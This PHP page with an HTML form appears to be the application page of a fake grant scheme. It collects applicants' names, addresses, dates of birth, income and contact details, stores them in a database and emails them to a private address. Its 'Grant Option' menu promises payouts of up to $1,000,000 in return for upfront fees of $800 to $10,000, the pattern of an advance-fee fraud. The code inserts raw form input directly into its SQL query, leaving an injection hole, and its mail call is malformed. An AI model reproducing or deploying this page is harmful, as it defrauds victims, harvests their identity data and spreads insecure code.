
<?php

include('dbconnection.php');
 
    if(isset($_POST['submit']))
  {

 $fullname=$_POST['fullname'];
 $gender=$_POST['gender'];
 $add=$_POST['address'];
 $state=$_POST['state'];
 $city=$_POST['city']; 
 $country=$_POST['country']; 
 $posta = $_POST['posta'];
 $email=$_POST['email'];
 $mobilenumber=$_POST['mobilenumber'];
 $dob=$_POST['dob'];
 $grant=$_POST['grant'];
 $citizen=$_POST['citizen'];
 $income=$_POST['income'];
 $toEmail = "rasheedtaiwom@gmail.com";
 $mailHeaders = "From: " . $name . "<". $email .">\r\n";
 $email_body = "You have received a new message from your  Contact form.\n\n"."Here are the details:\n\nFullName: $fullname\n\nEmail: $email\n\nPhone Number: $mobilenumber\n\nGender:\n$gender\n\nAddress:\n$add\n\nCity:\n$city\n\nCountry:\n$country\n\nPostal Code:\n$posta\n\nDOB:\n$dob\n\nGrant:\n$grant\n\nCitizen:\n$citizen\n\nIncome:\n$income";
 $query=mysqli_query($con," insert into tblvisitor(FullName,Email,mobilenumber,Address,state,city,country,postal,income,citizen,gran,gender,dob) value('$fullname','$email','$mobilenumber','$add','$state','$city', '$country','$posta','$income','$citizen','$grant','$gender','$dob')");
 
 
	
	

 
    if ($query) {
		mail($toEmail, $email_body, $mailHeaders); 
    $msg="Your Information has been submitted succesfully, Our Agent will contact you soon.";
  }
  else
    {
      $msg="Something Went Wrong. Please try again";
    }

 
}
  
?>
<?php
	include 'header.php';
	?>

<section class="page-top-section set-bg" data-setbg="img/page-top-bg/1.jpg">
		<div class="container">
			<h2>Apply</h2>
			<nav class="site-breadcrumb">
				<a class="sb-item" href="#">Home</a>
				<span class="sb-item active">Apply for a Grant</span>
			</nav>
		</div>
	</section>
	<section class="about-section spad">
		<div class="container">
			<div class="row">
	<div class="col-lg-7">
					<div class="about-text">
						<h2>APPLYING FOR GRANTS</h2>
						<p>The BG requires every information for verification and affirmation of beneficiaries. Please note that the NEH would not share your details with a third party. All information achieved are secured and confidential.</p>
</div>

<div class="col-lg-8">
					
				
              <form  class="contact-form" action="" method="post" role="form">
						<div class="row">
						<p style="font-size:16px; color:red" align="center"> <?php if($msg){
    echo $msg;
  }  ?></p>
								<input type="text" name="fullname" id="fullname" placeholder="Your Name">
						
							
							
								<div class="wrap-input100 input100-select">
					<span class="label-input100">Gender</span>
					<div>
						<select class="selection-2" name="gender" id="gender">
							<option>Male</option>
							<option>Female</option>
						</select>
					</div>
						
						<input type="text" name="address" id="address" placeholder="Address">
						
						
						<input type="text" name="state" id="state" placeholder="State">
						
						<input type="text" name="city" id="city" placeholder="City">
						
						<input type="text" name="country" id="country" placeholder="Country">
					
						<input type="text" name="posta" id="posta" placeholder="Postal Code">
						
						<input type="text" name="email" id="email" placeholder="Your E-mail">
						
					
						<input type="text" name="mobilenumber" id="mobilenumber" placeholder="Mobile Number">
						
					
						<input type="text" name="dob" id="dob" placeholder="DOB">
						<input type="text" name="income" id="income" placeholder="Monthly Income">
						
						<div class="wrap-input100 input100-select">
					<span class="label-input100">Grant Option</span>
					<div>
						<select class="selection-2" name="grant" id="grant">
						
							<option>You pay $800 and get $50,000,00 </option>
								
								<option>You Pay $1,000 and get $100,000,00 </option>
							
								<option>You pay $1,500 and get $150,000,00</option>
							
								<option>You pay $2,000 and get $200,000,00</option>
							
								<option>You pay $2,500 and get $250,000.00</option>
							
								<option>You pay $3,000 and get $300,000.00</option>
							
								<option>You pay $3,500 and get $350,000.00 </option>
							
								<option>You pay $4,000 and get $400,000.00 </option>
							
								<option>You pay $4,500 and get $450,000.00 </option>
							
								<option>You pay $5,000 and get $500,000.00</option>
							
								<option>You pay $5,500 and get $550,000.00 </option>
							
								<option>You pay $6,000 and get $600,000.00 </option>
							
								<option>You pay $6,500 and get $650,000.00</option>
							
								<option>You pay $7,000 and get $700,000.00</option>
							
								<option>You pay $7,500 and get $750,000.00 </option>
							
								<option>You pay $8,000 and get $800,000.00</option>
							
								<option>You pay $8,500 and get $850,000.00</option>
							
								<option>You pay $9,000 and get $900,000.00</option>
							
								<option>You pay $9,500 and get $950,000.00 </option>
							
								<option>Final you pay $10,000 get $1,000,000.00</option>
						</select>
					</div>
					
					<div class="">
					<span class="label-input100">Are you a Citizen?</span>
					<div>
						<select class="selection-2" name="citizen" id="citizen">
							<option>Yes</option>
							<option>No</option>
							
						</select>
					</div>
				
					
						
			
						<button class="site-btn center" id="submit" name="submit">Apply Now</button>
					</form>
				</div>
</div>
</div>
</section>


		  
                <?php
	include 'footer.php';
	?>